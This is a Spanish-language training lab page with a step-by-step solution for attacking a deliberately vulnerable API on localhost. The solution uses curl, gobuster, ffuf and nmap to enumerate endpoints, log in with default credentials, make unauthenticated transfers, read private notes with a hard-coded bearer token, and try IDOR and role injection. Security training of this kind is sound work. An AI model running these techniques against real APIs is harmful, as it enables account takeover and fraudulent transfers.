API Attacks Lab

Explora y explota vulnerabilidades en una API moderna. No se dan pistas en esta sección.

Objetivos

  • Identificar endpoints y métodos expuestos por la API.
  • Enumerar usuarios y recursos accesibles.
  • Encontrar puntos donde la autenticación o validación son insuficientes.
  • Exfiltrar datos sensibles o forzar transferencias si la lógica es vulnerable.

Endpoints disponibles

  • GET /api/v1/users — listar usuarios (público o con token).
  • POST /api/v1/auth — autenticación, devuelve token.
  • POST /api/v1/transfer — transferencias entre cuentas.
  • GET /api/v1/notes — notas privadas por usuario.

RESOLUCIÓN — API ATTACKS LAB

  1. Reconocimiento de la API
    • Enumera endpoints y métodos expuestos (GET/POST/OPTIONS). Herramientas útiles: curl, httpie, nmap, gobuster.
    • Busca documentación pública (OpenAPI/Swagger) en rutas comunes: /openapi.json, /swagger.json, /docs.
  2. Reconocimiento y enumeración (comandos) 
    # Probar métodos HTTP y cabeceras
curl -I -X OPTIONS http://localhost:5000/api/v1/users

# Buscar documentación OpenAPI/Swagger
curl http://localhost:5000/openapi.json || curl http://localhost:5000/swagger.json

# Enumeración con gobuster (paths comunes)
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,json -t 50

# Fuzzing de endpoints API con ffuf
ffuf -u "http://localhost:5000/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302

# Escaneo de puertos internos (si es posible)
nmap -Pn -p- 127.0.0.1

# Peticiones rápidas y formateo JSON (usa jq para extraer fields)
curl -s http://localhost:5000/api/v1/users | jq .
  3. Dificultad: Fácil
    • Prueba autenticaciones débiles con credenciales por defecto: 
      curl -X POST http://localhost:5000/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}'
    • Lista usuarios y recursos públicos: 
      curl http://localhost:5000/api/v1/users
    • Prueba operaciones sin autenticación (transferencias, lectura de notas): 
      curl -X POST http://localhost:5000/api/v1/transfer \
  -H 'Content-Type: application/json' \
  -d '{"amount":100,"to":"admin"}'
curl http://localhost:5000/api/v1/notes
  4. Dificultad: Media
    • Algunos endpoints requieren token: intenta obtener token y reutilizarlo en cabeceras Authorization: Bearer <token>. 
      TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin"}' | jq -r .token)
curl http://localhost:5000/api/v1/notes -H "Authorization: Bearer $TOKEN"
    • Prueba confirmaciones faltantes o validaciones insuficientes en transferencias (parametro confirm): 
      curl -X POST http://localhost:5000/api/v1/transfer \
  -H 'Content-Type: application/json' \
  -d '{"amount":100,"to":"admin","confirm":"yes"}'
  5. Dificultad: Difícil
    • En niveles altos, se exige cabecera específica: Authorization: Bearer hacklabs-integrity-token. Busca cómo derivar o forjar este token (exfil, endpoint leakage, reuso).
    • Si un endpoint restringe por rol, intenta escalados vía IDOR o manipulación de parámetros JSON (por ejemplo, inyectar "role":"admin" en objetos mal validados).

Comandos de ejemplo

# Autenticación insegura
curl -X POST http://localhost:5000/api/v1/auth -H 'Content-Type: application/json' -d '{"username":"victim","password":"password123"}'

# Enumerar usuarios
curl http://localhost:5000/api/v1/users

# Transferencia vulnerable (sin confirmación)
curl -X POST http://localhost:5000/api/v1/transfer -H 'Content-Type: application/json' -d '{"amount":100,"to":"admin"}'

# Acceso a notas privadas (con token si aplica)
curl http://localhost:5000/api/v1/notes -H 'Authorization: Bearer hacklabs-integrity-token'
